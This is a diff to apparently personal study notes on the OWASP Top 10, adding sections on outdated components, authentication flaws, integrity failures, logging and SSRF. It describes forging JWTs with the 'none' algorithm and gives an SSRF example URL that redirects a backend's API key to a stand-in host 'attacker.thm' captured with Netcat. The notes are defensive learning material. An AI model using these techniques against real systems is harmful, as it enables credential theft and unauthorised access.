@@ -666,21 +666,125 @@ These headers strengthen security and protect user privacy.
 
 The **Open Web Application Security Project** (OWASP) is a nonprofit foundation dedicated to helping the cybersecurity community understand web technologies, common exploits, and practical ways to secure software applications. As the final part of this module, I studied the **OWASP Top 10**, which highlights the most critical web application vulnerabilities.
 
-1. **Broken Access Control** (BAC) happens when a website’s restrictions fail, allowing unauthorized users to access pages or actions meant for admins only. This can expose sensitive data or let attackers perform restricted operations.
+### 1. Broken Access Control (BAC)
+
+BAC happens when a website’s restrictions fail, allowing unauthorized users to access pages or actions meant for admins only. This can expose sensitive data or let attackers perform restricted operations.
 
 **Insecure Direct Object Reference** (IDOR) is a specific case of BAC. It occurs when an application exposes a **Direct Object Reference** — like a user ID or file name — without proper checks. For example, if an `id` parameter in a URL isn’t validated correctly, an attacker could access another user’s information just by changing the value.
 
-2. **Cryptographic Failures** result from poor use of cryptographic algorithms. Web applications rely on **cryptography** to ensure **confidentiality**. Connections between the browser and server must be encrypted — this is called **encrypting data in transit**. Data should also be encrypted when stored, known as **encrypting data at rest**.
+### 2. Cryptographic Failures
+
+These failures result from poor use of cryptographic algorithms. Web applications rely on **cryptography** to ensure **confidentiality**. Connections between the browser and server must be encrypted — this is called **encrypting data in transit**. Data should also be encrypted when stored, known as **encrypting data at rest**.
 
 Databases make it easy for web applications to store and retrieve large amounts of data, but if a flat-file database like **SQLite** is stored carelessly inside a web root, it can lead to **Sensitive Data Exposure** — allowing attackers to download and query it directly, exposing critical details like credit card numbers and password hashes.
 
 Once an attacker has these password hashes, the next step is to crack them and recover the plaintext passwords. Using **Crackstation**, an online hash-cracking tool, works well for weak **MD5** hashes like these. Crackstation matches hashes against a massive wordlist — if the password is common, it will be cracked easily. If it’s not in the wordlist, the hash stays secure, which underlines the importance of using strong, unique passwords to reduce risk.
 
-3. Injection flaws are still a widespread threat and occur when an application processes user-controlled input as part of commands or queries. Common examples include **SQL Injection**, where user input is passed to database queries, and **Command Injection**, where user input is passed to system commands. Preventing injection relies on validating input strictly — for example, by **using an allow list** and **sanitizing input** to ensure it cannot be interpreted as executable code. In **Command Injection**, server-side code calls functions that directly interact with the server’s console. If an attacker exploits this, the damage can range from data theft to full system compromise.
+### 3. Injection
 
-4. **Insecure Design** refers to weaknesses rooted in how an application is planned and architected, not just coded. These flaws often come from poor threat modeling or temporary shortcuts — like disabling **One-Time Passwords** (OTP) for convenience — that accidentally remain in production. Because these issues are structural, they often require redesigning parts of the system instead of just patching code. For example, Instagram once used a 6-digit SMS code for password resets. Although brute-force attempts were blocked per IP after 250 tries, attackers bypassed this by spreading attempts across thousands of cloud-hosted IPs, showing how design flaws can defeat security controls. The best defense is strong threat modeling and secure design practices from the very beginning.
+Injection flaws are still a widespread threat and occur when an application processes user-controlled input as part of commands or queries. Common examples include **SQL Injection**, where user input is passed to database queries, and **Command Injection**, where user input is passed to system commands. Preventing injection relies on validating input strictly — for example, by **using an allow list** and **sanitizing input** to ensure it cannot be interpreted as executable code. In **Command Injection**, server-side code calls functions that directly interact with the server’s console. If an attacker exploits this, the damage can range from data theft to full system compromise.
 
-5. **Security Misconfigurations** happen when systems are not set up securely, even when the tools are available. Common cases include misconfigured cloud storage permissions, leftover default credentials, unused but active services, overly detailed error messages, or missing HTTP security headers. These gaps can expose applications to other threats like unauthorized data access, privilege escalation, or remote code execution.
+### 4. Insecure Design
+
+This refers to weaknesses rooted in how an application is planned and architected, not just coded. These flaws often come from poor threat modeling or temporary shortcuts — like disabling **One-Time Passwords** (OTP) for convenience — that accidentally remain in production. Because these issues are structural, they often require redesigning parts of the system instead of just patching code. For example, Instagram once used a 6-digit SMS code for password resets. Although brute-force attempts were blocked per IP after 250 tries, attackers bypassed this by spreading attempts across thousands of cloud-hosted IPs, showing how design flaws can defeat security controls. The best defense is strong threat modeling and secure design practices from the very beginning.
+
+### 5. Security Misconfigurations
+
+They happen when systems are not set up securely, even when the tools are available. Common cases include misconfigured cloud storage permissions, leftover default credentials, unused but active services, overly detailed error messages, or missing HTTP security headers. These gaps can expose applications to other threats like unauthorized data access, privilege escalation, or remote code execution.
+
+### 6. Vulnerable and Outdated Components
+
+These componenets expose an application to known exploits that attackers can easily find online, such as on **Exploit-DB** (`https://www.exploit-db.com/exploits/41962`). When software isn’t kept up to date, old vulnerabilities remain unpatched, making it straightforward for attackers — and useful for penetration testers — to locate and use ready-made exploits.
+
+### 7. Identification and Authentication Failures
+
+They occur when systems don’t properly verify or manage user identities and sessions. **Authentication** confirms who a user is — typically with a username and password — while **session management** keeps track of logged-in users through session cookies, since **HTTP(S)** is stateless by default. Weaknesses here can let attackers hijack accounts and steal sensitive data.
+
+- **Common Weaknesses:**
+  - Brute force attacks: Repeated attempts to guess credentials if there’s no rate-limiting.
+  - Weak passwords: Poor password policies let users choose simple, guessable passwords.
+  - Predictable session cookies: If cookies aren’t random and secure, attackers can forge them to impersonate users.
+
+- **Key Defenses:**
+  - Enforce strong password complexity rules.
+  - Implement account lockouts after repeated failed attempts.
+  - Use **Multi-Factor Authentication** (MFA) to add an extra verification step, making compromise much harder.
+
+A common flaw in username handling is weak input validation, which can let attackers create near-duplicate accounts that inherit privileges. For example, if `darren` exists, registering `" darren"` (with a space) may create a new account treated like the original. If access checks rely only on a loose username match, the new user may see all of `darren`’s private content or admin rights. This happens when the system fails to normalize input, letting slight variations bypass uniqueness checks and reuse privileges.
+
+### 8. Software and Data Integrity Failures
+
+These failures happen when applications or systems fail to verify that code and data haven’t been maliciously altered. Maintaining **integrity** is critical in cybersecurity to keep important data free from unauthorized modifications. To confirm that a downloaded file wasn’t changed in transit, developers often publish a **hash** (using algorithms like **MD5**, **SHA1**, or **SHA256**) alongside the file for verification. A lack of integrity checks can let attackers slip in malicious changes unnoticed.
+
+- **Software integrity failures**: Many websites load third-party libraries, like **jQuery**, directly from external servers. If these external sources are compromised and there’s no integrity check, attackers can inject malicious scripts that run silently in users’ browsers. To prevent this, **Subresource Integrity** (SRI) adds a cryptographic hash to the `<script>` tag, so the browser will only run the script if its hash matches the expected one. For example:
+
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+```
+
+This simple step ensures users get the exact code intended.
+
+- **Data integrity failures**: When a user logs into a web application, a **token** is often stored in the browser to manage the session — usually as a cookie. To protect and validate this data, **JSON Web Tokens** (JWTs) are used because they include built-in integrity checks. A JWT has three parts:
+
+  - The **header**, which holds metadata like the token type (**JWT**) and the signing algorithm (**HS256**).
+  - The **payload**, containing the key-value pairs the application wants the browser to store.
+  - The **signature**, which acts like a hash but uses a secret key only the server knows. If someone tampers with the payload, the signature won’t match, and the application knows the data has been altered.
+
+This protects sessions from unauthorized modification.
+
+Attackers have exploited weaknesses in JWT libraries by abusing the **None Algorithm**. Some flawed implementations let attackers bypass the signature check altogether. By modifying the JWT’s header to set `alg` to `none` and removing the signature section, an attacker could change the payload — for example, setting the username to `admin` — and re-encode the token. The token would pass verification if the system failed to reject `none` as an algorithm, granting access without a valid signature. This highlights why correct JWT handling and validation are essential.
+
+### 9. Security Logging and Monitoring Failures
+
+9. Security Logging and Monitoring Failures
+
+A well-configured web application logs user actions consistently. This is critical during security incidents because it allows activities to be traced and the impact to be assessed accurately. If logging is not properly set up, the consequences can be significant, including:
+
+- **Regulatory damage** — if an attacker gains access to personal identifiers and there are no logs to prove what happened, the final user is affected and the web application owner could face heavy fines.
+- **Risk of further attacks** — without logs, malicious activity may go undetected, giving attackers more time to exploit vulnerabilities.
+
+Logs should track the following and should be stored in separate, secure locations (especially when they contain sensitive data):
+
+- HTTP status codes
+- Timestamps
+- Usernames
+- API endpoints or page locations
+- IP addresses
+
+Logs are often most valuable after an incident, but preventing attacks is always the goal. For this reason, monitoring suspicious activity is crucial. Common suspicious activities include:
+
+- Unauthorized attempts to perform restricted actions
+- Requests from anomalous IP addresses or unexpected locations (though these can generate false positives)
+- Use of automated tools, detected through unusual `user-agent` headers or abnormally fast requests
+- Payload patterns that indicate malicious testing of web applications
+
+10. Server-Side Request Forgery (SSRF)
+
+**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker tricks a web application into sending crafted requests to unintended destinations. The attacker often controls the request parameters. SSRF usually stems from weak input validation when an application communicates with external services.
+
+**TryHackMe (THM)** explains this with an example: an application uses a third-party SMS API, adding a secret API key to authenticate each request. If the server address parameter is exposed to users, an attacker can modify it to point to their own server, capture the API key, and send SMS messages at the victim’s expense.
+
+For example, requesting:
+
+```
+https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+```
+
+forces the backend to send:
+
+```
+https://attacker.thm/api/send?msg=ABC
+```
+
+The attacker listens with `Netcat` to capture the request and its credentials.
+
+Beyond credential theft, SSRF can also be used to:
+
+- Scan internal networks and discover open ports
+- Exploit trust relationships between internal services
+- Access non-HTTP services, which can sometimes lead to Remote Code Execution (RCE)
+
+Strong input validation, strict whitelisting of allowed destinations, and proper network segmentation are key to reducing SSRF risks.
 
 ### Premium-Only Content
 
